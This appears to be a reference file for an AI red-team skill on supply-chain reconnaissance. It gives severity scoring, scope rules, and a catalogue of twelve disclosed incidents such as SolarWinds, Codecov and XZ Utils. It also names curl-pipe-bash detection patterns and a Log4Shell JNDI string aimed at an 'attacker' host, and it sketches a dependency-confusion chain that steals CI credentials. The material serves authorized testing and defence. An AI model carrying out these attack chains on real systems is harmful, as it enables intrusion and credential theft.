# Details (moved from SKILL.md)

> Extended reference content for `supply-chain-attack-recon`, kept under `references/` so the entrypoint stays within the audit budget.

## Severity scoring guidance

| Finding | Severity |
|---|---|
| Internal package name + no scope-mapping + unclaimed on public npm + actively in builds | **Critical** — Dep-confusion RCE |
| Internal package name + scope-mapping in `.npmrc` but `_authToken` leaked | **Critical** — direct registry push |
| Pull_request_target workflow + secrets exposed + PR-controlled code execution | **Critical** — Org-wide token theft |
| Docker image with leaked secret in layer | **High** (varies by secret) |
| Internal registry URL disclosed (but no creds) | **Low** — Info-disc only |
| Typosquat candidate identified (not published) | **Informational** — Awareness item |
| Public org has 1000+ unused names that COULD be claimed | **Informational** — Hygiene |

---


## Anti-patterns

- **DO NOT publish a typosquat / dep-confusion package without explicit, signed, scope-clarified authorization** — this affects users outside the engagement
- **DO NOT submit PRs to client repos as part of testing without specific OK** — workflow injection PoCs may be needed but they touch CI/CD and other developers
- **DO NOT scrape entire npm/PyPI for typosquat candidates** — irresponsible and noisy
- **DO NOT confuse "name is unclaimed" with "exploitable dependency confusion"** — the build system matters; many orgs use proper scope-mapping that prevents the attack
- **DO NOT touch GitHub Actions self-hosted runners** — they may be inside the client network and outside the external scope
- **DO NOT pull large Docker images blindly** — image bandwidth can be 5-50GB; review tags first

---


## What constitutes a deliverable finding

A supply-chain finding needs ALL of:
1. **Concrete name/path** — exact internal package name, exact workflow file path, exact image tag
2. **Vulnerability mechanism** — dep-confusion / typosquat / injection / etc.
3. **Exploitability evidence** — proof the build/install would actually use the attacker's payload (not just "name is unclaimed")
4. **Severity** — calibrated to blast radius (one developer? all developers? all users of the package?)
5. **Recommendation** — specific (e.g., "register the unused name @target-internal/utils on npm AS YOUR OWN even if unused; configure `.npmrc` scope:registry mapping")

---


## Bridge to neighboring skills

- `apk-redteam-pipeline` — APKs reveal internal package names too (find them in decompiled `build.gradle`)
- `cloud-iam-deep` — CI/CD secrets often = cloud credentials; this skill finds them, that skill validates them
- `hunt-cloud-misconfig` — CI/CD pipeline misconfig (Jenkins / GitLab Runner) overlap
- `m365-entra-attack` — Azure DevOps pipelines are part of Entra surface
- `redteam-report-template` — supply-chain findings need extra clarity on blast radius (one repo vs whole ecosystem)
- `mid-engagement-ir-detection` — registering a name on public npm triggers nothing inside the client, but ANY publish action is loud and audit-trailed

---


## External-only boundary check

This skill is squarely external — all targets are public registries / public GitHub. If the engagement involves the client's internal artifact registry (internal Nexus, JFrog, Sonatype), that is internal infrastructure and OUT OF SCOPE per `feedback_skill_boundaries`. Report internal-registry URL exposure as a finding; do not attempt to enumerate it.

---


## Real-world references

- **Alex Birsan 2021** — Original dependency-confusion research, $130K+ in bounties from Apple/Microsoft/PayPal/Yelp/etc.
- **ua-parser-js 2021** — npm package compromise via stolen maintainer credentials
- **node-ipc 2022** — Maintainer-introduced supply-chain malicious update
- **3CX 2023** — Cascading supply-chain attack via X_TRADER → 3CX → customers
- **XZ Utils 2024** — Multi-year social-engineering supply-chain attack on upstream OSS

Each of these is worth reading for what made the attack effective and what red flags existed earlier.

---


## Disclosed-case catalogue (citations)

Twelve well-documented public cases, mapped to the recon surface above. Each entry: attack name, year, flow, root cause, impact, references, and the recon-skill takeaway.

### 1. SolarWinds Orion / SUNBURST (CISA AA20-352A, Dec 2020)

- **Flow:** APT29 (UNC2452 / Cozy Bear) breached SolarWinds' build pipeline and inserted the SUNBURST backdoor into `SolarWinds.Orion.Core.BusinessLayer.dll`. The trojanized DLL was code-signed with SolarWinds' legitimate certificate and shipped to ~18,000 customers via the normal auto-update channel between March and June 2020.
- **Root cause:** Build-environment compromise — attackers modified source mid-compilation; signing infrastructure trusted the build output without verifying source integrity.
- **Impact:** ~18,000 organisations received the backdoor; ~100 (incl. US Treasury, Commerce, DHS, DoJ, Microsoft, FireEye/Mandiant) received the SECOND-stage TEARDROP/BEACON payload. SolarWinds reported >$40M in direct response costs; class-action settlement $26M.
- **References:**
  - CISA AA20-352A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a
  - Mandiant write-up (SUNBURST): https://cloud.google.com/blog/topics/threat-intelligence/sunburst-additional-technical-details
  - Microsoft analysis: https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack/
  - SolarWinds post-mortem: https://orangematter.solarwinds.com/2021/01/11/new-findings-from-our-investigation-of-sunburst/
- **Recon takeaway:** Whenever a target ships signed binaries from their own CI, the recon check is: is the build environment itself reachable? Look for exposed Jenkins/GitLab CI consoles, public TeamCity agents, or build artefacts that leak source paths. A code-signing cert plus a compromised build = unstoppable trust chain.

### 2. 3CX VoIP softphone supply chain (CVE-2023-29059, March 2023)

- **Flow:** DPRK-attributed Lazarus subgroup (UNC4736 / Labyrinth Chollima) trojanized the 3CX DesktopApp (Electron-based softphone) on both Windows and macOS. Initial entry was via a PREVIOUS supply-chain attack — an employee installed a backdoored copy of Trading Technologies' X_TRADER, the FIRST disclosed cascading supply-chain compromise (one supply-chain victim becomes another's vector).
- **Root cause:** Dev workstation compromise → access to 3CX source/build pipeline → malicious `ffmpeg.dll` and `d3dcompiler_47.dll` shipped in signed installer.
- **Impact:** ~600,000 organisations use 3CX; tens of thousands of trojanized clients downloaded. Lazarus selectively activated second-stage payloads against cryptocurrency and trading firms.
- **References:**
  - CrowdStrike: https://www.crowdstrike.com/en-us/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/
  - SentinelOne: https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/
  - Mandiant cascading attack analysis: https://cloud.google.com/blog/topics/threat-intelligence/3cx-software-supply-chain-compromise
  - 3CX post-mortem: https://www.3cx.com/blog/news/desktopapp-security-alert-update/
- **Recon takeaway:** Cascading supply chain is real — your target's vendors' vendors matter. When recon enumerates "what software does this org install on engineer laptops," each one is itself a supply-chain target. Electron apps (signed JS bundles) are especially common vectors.

### 3. MOVEit Transfer mass exploitation (CVE-2023-34362, May–July 2023)

- **Flow:** Cl0p ransomware affiliate (FIN11 / Lace Tempest) discovered an unauthenticated SQLi in Progress MOVEit Transfer, deployed the LEMURLOOT webshell, and exfiltrated files from every internet-reachable instance over a ~2-week window before the patch dropped on 31 May 2023.
- **Root cause:** Pre-auth SQLi in `moveitisapi/moveitisapi.dll` → arbitrary SQL → write webshell via `xp_cmdshell`-equivalent path. Classic single-CVE-mass-exploitation; not a build-pipeline attack but a SHIPPED-CODE supply-chain failure.
- **Impact:** ~2,700 organisations confirmed compromised, ~95 million individuals' PII leaked (BBC, Shell, BA, US DoE, Louisiana OMV, Oregon DMV, etc.). Estimated losses >$15B aggregated.
- **References:**
  - CISA AA23-158A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a
  - Progress advisory: https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023
  - Mandiant: https://cloud.google.com/blog/topics/threat-intelligence/zero-day-moveit-data-theft
  - Huntress technical breakdown: https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response
- **Recon takeaway:** Vendor file-transfer products (MOVEit, Accellion FTA, GoAnywhere MFT, Cleo Harmony) are the recurring "internet edge, holds everyone's data, runs on Windows" pattern. Always fingerprint by HTML title / favicon hash early in recon; a single edge-product CVE = entire customer base.

### 4. Codecov bash uploader compromise (Apr 2021)

- **Flow:** Attackers gained access to Codecov's Docker image build process via a credential mistake in the image-creation flow, then modified the `Bash Uploader` script (`https://codecov.io/bash`) to exfiltrate environment variables to a third-party IP. The modification persisted from 31 Jan 2021 to 1 Apr 2021 — two months before detection by a customer who noticed an SHA-256 mismatch.
- **Root cause:** Docker image build leaked a credential allowing modification of the served bash script; no integrity verification (no signed pinned hash) on the customer side.
- **Impact:** Every CI run worldwide that piped `curl -s https://codecov.io/bash | bash` for 2 months exfiltrated env vars. Confirmed downstream victims: HashiCorp (rotated GPG key), Twilio, Rapid7 (source-code partial exposure), Mercari, Confluent, Atlassian. <!-- security-allowlist: curl-pipe-bash -->
- **References:**
  - Codecov post-mortem: https://about.codecov.io/security-update/
  - HashiCorp advisory: https://discuss.hashicorp.com/t/hcsec-2021-12-codecov-security-event-and-hashicorp-gpg-key-exposure/23512
  - Mercari disclosure: https://about.mercari.com/en/press/news/articles/20210521_incidentreport/
  - Rapid7: https://www.rapid7.com/blog/post/2021/05/13/rapid7-discloses-its-response-to-codecov-incident/
- **Recon takeaway:** "Curl-bash-install" patterns in public CI workflows are gold for this recon skill — search `.github/workflows/` for `curl ... | bash`, `wget ... | sh`, `iwr ... | iex`. Any third-party URL fed into a shell is a supply-chain blast radius. Pinned SHAs in workflows mitigate; absence of pinning = finding. <!-- security-allowlist: curl-pipe-bash, wget-pipe-sh, irm-pipe-iex -->

### 5. ua-parser-js npm hijack (Oct 2021)

- **Flow:** Attacker phished/credential-stuffed the maintainer's npm account and published `0.7.29`, `0.8.0`, and `1.0.0` of `ua-parser-js` (≈7M weekly downloads, transitively reaching Facebook, Microsoft, Amazon, IBM). The malicious versions ran a `preinstall` hook that downloaded a cryptominer + Windows password-stealer (Jason credential stealer).
- **Root cause:** Maintainer npm account had no 2FA / weak credentials; npm did not enforce 2FA for high-value publishers at the time.
- **Impact:** Packages live ~4 hours before takedown but tens of thousands of installs in that window. CISA issued an emergency alert — the first time CISA had ever warned on an npm-package compromise.
- **References:**
  - GitHub Security advisory: https://github.com/advisories/GHSA-pjwm-rvh2-c87w
  - CISA alert: https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js
  - Maintainer's incident note: https://github.com/faisalman/ua-parser-js/issues/536
  - Snyk analysis: https://snyk.io/blog/npm-security-malicious-code-found-in-npm-package-ua-parser-js/
- **Recon takeaway:** Identify your target's top-30 npm/PyPI maintainers by package download count, then check whether their accounts have 2FA enabled (npm exposes this via `npm profile get` on org members, partially public via the registry API). Recon output: "these 4 maintainers control packages with X installs and have no 2FA per public registry data."

### 6. event-stream npm package (Nov 2018)

- **Flow:** Original maintainer Dominic Tarr (no longer using the module) handed `event-stream` (≈2M weekly downloads) to a new contributor named "right9ctrl" who'd offered to maintain it. The new maintainer added `flatmap-stream` as a dependency, then pushed an update to `flatmap-stream` containing payload targeting the Copay bitcoin wallet's build — stole BTC/BCH wallet seeds from any Copay user.
- **Root cause:** Social engineering of a maintenance-handover; no review of new contributors taking over critical packages. The malicious dep was only triggered when `event-stream` was bundled into the Copay wallet (build-context targeting).
- **Impact:** Copay wallet users had keys stolen; exact dollar damage never disclosed publicly. Triggered the npm-wide 2FA push and "popular packages need additional review" policy.
- **References:**
  - GitHub Security advisory: https://github.com/advisories/GHSA-mh6f-8j2x-4483
  - npm post-mortem: https://github.blog/2018-11-26-npm-package-event-stream/
  - Original disclosure thread: https://github.com/dominictarr/event-stream/issues/116
  - Snyk write-up: https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/
- **Recon takeaway:** Check `npm view <pkg> maintainers` and recent maintainer changes for packages your target depends on. A maintainer change in the past 90 days on a 100K+ download package is a yellow flag. Also: payload-targeting-by-build-context (only fires when bundled into specific app) is HARD to detect — static scanners miss it.

### 7. PHP Git server compromise (March 2021)

- **Flow:** Attackers pushed two malicious commits to the official `php-src` git repository on `git.php.net`, signed as Rasmus Lerdorf and Nikita Popov. The commits added a Zend backdoor that executed code from the `User-Agentt` HTTP header (note double-t).
- **Root cause:** Self-hosted git server (Gitolite-based `git.php.net`) had a credential / authentication flaw — possibly password-stored-in-plain in a user database leak. PHP team migrated to GitHub as canonical source after this incident.
- **Impact:** Backdoor commits caught within hours, never shipped in a release. But this is the canonical case of "self-hosted source-of-truth = single point of failure."
- **References:**
  - PHP.net post-mortem: https://news-web.php.net/php.internals/113838
  - Nikita Popov's analysis: https://externals.io/message/113848
  - ZDNet coverage: https://www.zdnet.com/article/php-internal-git-server-hacked-with-malicious-code-pushed-to-the-php-src-repo/
- **Recon takeaway:** Targets running self-hosted git (Gitea, Gitolite, Phabricator, Bitbucket Server) are higher-risk than GitHub-hosted. Recon should fingerprint git-server software, check for default creds, and watch for SSH-key-based pushes from unexpected IPs (visible in commit metadata).

### 8. Log4Shell (CVE-2021-44228, Dec 2021)

- **Flow:** Not a supply-chain ATTACK per se, but the canonical "you don't know what's in your dependency tree" event. A JNDI lookup feature in Apache Log4j 2.x allowed remote code execution via `${jndi:ldap://attacker/...}` in any logged string. Because Log4j is transitively pulled by thousands of Java apps, hundreds of millions of systems were vulnerable.
- **Root cause:** Unsafe-by-default feature shipped in 2013 (`MessageLookup` substitution); deeply nested transitive dependency made inventory and patching almost impossible.
- **Impact:** "Most critical vulnerability in a decade" per CISA Director Jen Easterly. Affected every major cloud, every Apache product, every Java enterprise stack. Ongoing mass exploitation by Conti, Khonsari ransomware, state actors.
- **References:**
  - CISA Log4j page: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
  - Apache advisory: https://logging.apache.org/log4j/2.x/security.html
  - LunaSec breakdown: https://www.lunasec.io/docs/blog/log4j-zero-day/
  - GovCERT.ch tree of impacted products: https://www.cisa.gov/known-exploited-vulnerabilities-catalog (KEV entry)
- **Recon takeaway:** SBOMs are the answer here. The recon skill's Step 8 (SBOM mining) earns its keep — pulling SPDX/CycloneDX from public release artefacts gives you exact transitive dependency versions, which you can then map to OSV / NVD for known CVEs. Most orgs underestimate their transitive depth.

### 9. tj-actions/changed-files GitHub Action compromise (CVE-2025-30066, March 2025)

- **Flow:** Attacker compromised the `tj-actions/changed-files` GitHub Action (used by ~23,000 repos) and modified all version tags v1–v45 to point to a malicious commit. The injected code ran `printenv` and dumped CI secrets to GitHub Actions logs — visible to anyone with read access on public repos.
- **Root cause:** Mutable tag references in GitHub Actions — `uses: tj-actions/changed-files@v35` resolves at run time, so an attacker who controls the repo can repoint old tags. Most consumers had not pinned to commit SHA (`@<sha>`).
- **Impact:** ~23,000 repositories impacted; CISA added to KEV; thousands of secrets (AWS keys, npm tokens, Docker Hub creds) leaked into public Action logs. Multiple downstream incidents (Coinbase, Cloudflare, others) traced back.
- **References:**
  - CISA KEV entry: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066
  - StepSecurity disclosure: https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
  - Wiz analysis: https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
  - Semgrep: https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/
- **Recon takeaway:** This is the highest-yield current recon vector. Grep public repos for `uses: <org>/<repo>@v\d+` (mutable tag) versus `uses: <org>/<repo>@<sha>` (pinned). Any unpinned third-party action = supply-chain risk. The skill's Step 6 should explicitly flag mutable-tag usage.

### 10. PyPI typosquats (`colourama`, `python3-dateutil`, `jeIlyfish`, et al.)

- **Flow:** Attackers register PyPI packages with names visually/typographically similar to popular ones — `colourama` for `colorama`, `python3-dateutil` for `python-dateutil`, `jeIlyfish` (capital-I instead of L) for `jellyfish`. Each contained `setup.py` post-install hooks exfiltrating SSH keys, GPG keys, GitHub tokens, or installing crypto-stealers targeting `~/.bitcoin/wallet.dat`.
- **Root cause:** PyPI permits visually-confusable names; pip resolves names by exact string match. No human-review gate on new package publication.
- **Impact:** Each campaign typically <10K installs before takedown, but `jeIlyfish` lived 1 year (Dec 2018 → Dec 2019). Cumulative: dozens of campaigns documented annually by Snyk/Phylum/Sonatype/ReversingLabs.
- **References:**
  - ReversingLabs jeIlyfish/python3-dateutil: https://www.reversinglabs.com/blog/mining-for-malicious-ruby-gems
  - Snyk colourama / pytagora analysis: https://snyk.io/blog/malicious-packages-found-to-be-typo-squatting-in-pypi/
  - Phylum 2024 typosquat report: https://blog.phylum.io/the-state-of-the-software-supply-chain/
  - Sonatype 2024 State of the Software Supply Chain (>700K malicious packages found): https://www.sonatype.com/state-of-the-software-supply-chain/
- **Recon takeaway:** Step 5 of the skill (typosquat candidate generation) maps directly here. For external recon, you LIST candidate typosquat names — you NEVER publish unless explicitly authorized. The deliverable is "these 17 typosquat variants of your top deps are currently unclaimed; recommendation: register them defensively."

### 11. Alex Birsan dependency-confusion disclosure (Feb 2021)

- **Flow:** Birsan extracted internal npm scope names from leaked `package.json` files (publicly cached on archive.org, accidentally-public GitHub repos, JS bundles) for Apple, Microsoft, PayPal, Shopify, Uber, Tesla, Yelp, and ~35 others. He published packages on public npm/PyPI/RubyGems with those internal names AND a higher semver. Most companies' build systems then resolved the public package over the internal one and executed his telemetry-only payload.
- **Root cause:** Package managers (npm, pip, gem) default to "highest version wins, regardless of registry." Internal-package names leaked to external sources. No scope-to-registry enforcement.
- **Impact:** $130K+ in bug bounties (highest known SINGLE researcher payout across multiple programs in 2021); birthed the entire "dependency confusion" attack class; npm/PyPI/Microsoft Azure Artifacts all issued mitigations.
- **References:**
  - Original Birsan write-up: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
  - Microsoft white paper: https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/
  - GitHub post-mortem (npm side): https://github.blog/2021-02-12-how-to-prevent-dependency-confusion-on-public-package-registries/
  - Snyk research: https://snyk.io/blog/dependency-confusion-vulnerability-novel-supply-chain-attack/
- **Recon takeaway:** This is the founding citation for Step 3 + Step 4 of the skill. Internal scope discovery via JS bundles is the canonical recon path. Note Birsan's severity calibration: "name is unclaimed" alone was enough at most targets because their builds used `npm install` against a config that fell through to public npm — but the skill's severity table correctly notes this isn't universal.

### 12. XZ Utils (CVE-2024-3094, March 2024)

- **Flow:** "Jia Tan" (`JiaT75`) social-engineered the maintainer of `xz-utils` (an upstream OSS compression library used in nearly every Linux distro) over 2+ years. Once granted co-maintainer status, they inserted a multi-stage backdoor into `liblzma` build process — obfuscated as test fixtures — that would hijack SSH authentication via OpenSSH's systemd-notify integration.
- **Root cause:** Single-maintainer OSS burnout + nation-state-grade patience (Operation J / suspected APT). The backdoor was caught BEFORE major distros shipped it (only Fedora Rawhide and Debian unstable had it briefly) because Andres Freund noticed a 500ms SSH delay during a benchmark.
- **Impact:** Caught before mass deployment, near-miss event. Triggered industry-wide reassessment of "single-maintainer critical OSS" risk. CISA, NIST, OpenSSF all issued post-mortems.
- **References:**
  - CISA advisory: https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094
  - Andres Freund's original disclosure: https://www.openwall.com/lists/oss-security/2024/03/29/4
  - Russ Cox timeline: https://research.swtch.com/xz-timeline
  - Sam James technical breakdown: https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27
- **Recon takeaway:** Hardest case for external recon — social-engineering a maintainer over years leaves few external signals. But: GitHub commit-history analysis (new contributors gaining commit access on critical libs, commits adding obfuscated test fixtures, build-only-on-release changes) is what Andres Freund effectively did. The skill's Step 2 (enumerate public repos) can be extended to "watch for high-trust grants to low-history accounts."

---

### Coverage map: cases → recon skill steps

| Step in skill | Anchoring case(s) |
|---|---|
| Step 1 — GitHub org discovery | Birsan 2021, XZ 2024 |
| Step 2 — Public repo artefact mining | Codecov 2021, XZ 2024, PHP 2021 |
| Step 3 — Internal package-name discovery | Birsan 2021 |
| Step 4 — Dependency-confusion check | Birsan 2021, ua-parser-js 2021 |
| Step 5 — Typosquat candidates | PyPI `colourama`/`jeIlyfish`, event-stream 2018 |
| Step 6 — GitHub Actions workflow injection | tj-actions/changed-files 2025, Codecov 2021 |
| Step 7 — Docker/container registry mining | Codecov 2021, 3CX 2023 |
| Step 8 — SBOM / artefact metadata | Log4Shell 2021, MOVEit 2023 |
| Step 9 — Internal registry URL leakage | Birsan 2021, SolarWinds 2020 |
| Step 10 — npm/PyPI org presence | ua-parser-js 2021, event-stream 2018 |

### Patterns across all 12 cases

- **Code-signing does NOT save you** — SolarWinds, 3CX, ua-parser-js all shipped legitimately-signed malicious code.
- **Pinning to mutable references is the recurring failure** — `curl | bash` (Codecov), `@v35` action tags (tj-actions), `^1.0.0` semver (Birsan, event-stream). <!-- security-allowlist: curl-pipe-bash -->
- **Maintainer-account compromise > technical CVE** for npm/PyPI ecosystem — 6 of 12 cases.
- **Cascading supply chain is now normal** — 3CX from X_TRADER; Codecov → HashiCorp → HashiCorp's downstream users. Assume your target's vendors' vendors are in scope conceptually.
- **CI runners are the highest-value foothold** — every case where attacker code executed on a CI runner yielded cloud / GitHub / secrets in bulk.

---


## Related Skills & Chains

- **`hunt-rce`** — Dependency confusion lands as RCE on whatever runner installs the package; CI runners are the highest-value target. Chain primitive: internal package name leaked in public JS bundle / SBOM / Docker image → publish malicious package to public npm/PyPI under same name with higher version → next `npm install` / `pip install` on CI runner executes attacker code in `preinstall` hook → `hunt-rce` post-foothold (env-var extraction yields AWS keys, GitHub PATs, Slack tokens) → CI-plane takeover.
- **`cloud-iam-deep`** — CI runners have IAM credentials; supply-chain RCE there is a credential-exfil bonanza. Chain primitive: malicious package executes on GitHub Actions runner → reads `$AWS_ACCESS_KEY_ID` / `$GITHUB_TOKEN` from env → `cloud-iam-deep` enumeration → IAM-privilege-escalation chain → production cloud-plane access.
- **`offensive-osint`** — Recon discipline overlaps heavily; SBOMs, JS bundles, GitHub org enumeration, Docker registry tags all live in both. Chain primitive: `offensive-osint` GitHub-org recon yields internal package names referenced in CI workflows → `supply-chain-attack-recon` cross-references these against public npm/PyPI for typosquat/confusion candidates.
- **`hunt-cloud-misconfig`** — Container registries (Docker Hub, GHCR, ECR public) frequently expose private images by accident. Chain primitive: SBOM mining reveals `internal-tools-v2:latest` referenced → check Docker Hub for accidentally-public mirror → `hunt-cloud-misconfig` registry enum → pull image → extract secrets baked into layers.
- **`triage-validation`** + **`redteam-report-template`** — Supply-chain RECON is in scope; actual publishing is EXTERNAL-OFFENSIVE and needs explicit written sign-off. Chain primitive: recon-only candidate list assembled → run through `triage-validation` 7-Question Gate (specifically: "can I demonstrate impact WITHOUT publishing?") → report as "dependency-confusion candidate inventory + reproduction steps" via `redteam-report-template`, never as a published-package PoC unless client signed off in writing.

